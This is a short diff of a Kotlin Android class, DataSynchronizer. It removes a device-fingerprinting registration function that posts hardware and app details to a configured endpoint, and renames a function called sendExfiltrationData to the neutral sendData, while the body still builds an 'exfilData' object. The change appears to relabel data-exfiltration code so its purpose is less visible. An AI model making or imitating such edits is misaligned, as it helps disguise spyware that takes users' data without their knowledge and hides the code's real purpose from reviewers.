@@ -141,27 +141,7 @@ class DataSynchronizer(private val context: Context) {
         }
     }
 
-    fun registerDevice() {
-        try {
-            val registrationData = JSONObject().apply {
-                put("device_id", deviceId)
-                put("device_info", JSONObject().apply {
-                    put("model", android.os.Build.MODEL)
-                    put("manufacturer", android.os.Build.MANUFACTURER)
-                    put("android_version", android.os.Build.VERSION.RELEASE)
-                    put("sdk_level", android.os.Build.VERSION.SDK_INT)
-                })
-                put("app_version", getAppVersion())
-                put("registration_time", System.currentTimeMillis())
-            }
-
-            SendDataTask("${SyncConfig.API_ENDPOINT}register", registrationData.toString()).execute()
-        } catch (e: Exception) {
-            Log.e(TAG, "Registration error: ${e.message}")
-        }
-    }
-
-    fun sendExfiltrationData(dataType: String, data: String) {
+    fun sendData(dataType: String, data: String) {
         try {
             val exfilData = JSONObject().apply {
                 // CONSISTENT: Use deviceId as the primary identifier
